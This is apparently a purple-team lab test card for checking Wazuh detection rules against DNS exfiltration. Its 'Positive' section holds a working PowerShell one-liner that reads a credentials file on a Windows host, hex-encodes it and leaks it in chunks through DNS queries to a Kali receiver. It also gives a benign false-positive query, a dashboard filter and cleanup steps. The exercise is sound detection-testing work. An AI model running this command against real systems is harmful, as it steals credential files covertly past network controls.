# DNS credential-file exfiltration

## Positive

Kali: start the bounded UDP/53 receiver on the verified host-only address.

WIN01, Yassine PowerShell:

```powershell
$p="$env:USERPROFILE\Documents\Finance\Q3_Acquisition_DB_Credentials.txt";$b=[IO.File]::ReadAllBytes($p);$h=-join($b|ForEach-Object{$_.ToString('x2')});$n=0;for($o=0;$o-lt$h.Length;$o+=48){$n++};$s='w'+('{0:x6}'-f(Get-Random -Maximum 16777215));$i=0;for($o=0;$o-lt$h.Length;$o+=48){$l=48;if(($o+$l)-gt$h.Length){$l=$h.Length-$o};$c=$h.Substring($o,$l);Resolve-DnsName -Name "$s.$i.$n.$c.x.lab" -Server <KALI_HOST_ONLY> -Type A -DnsOnly -NoHostsFile -QuickTimeout -ErrorAction Stop|Out-Null;$i++;Start-Sleep -Milliseconds 75};"DNS_EXFIL_COMPLETE chunks=$n session=$s"
```

Require exact receiver byte count and SHA-256, then Wazuh rules `100534` and `100535`.

## False-positive test

```powershell
Resolve-DnsName "dc01.simulation.local" -Type A -DnsOnly|Out-Null
```

Expected: DNS Client telemetry, no `100533`, `100534`, or `100535`.

## Dashboard

```text
agent.id:"004" AND rule.id:("100534" OR "100535")
```

## Cleanup

Stop the Kali DNS receiver. Retain the controlled fixture unless cleanup is requested.
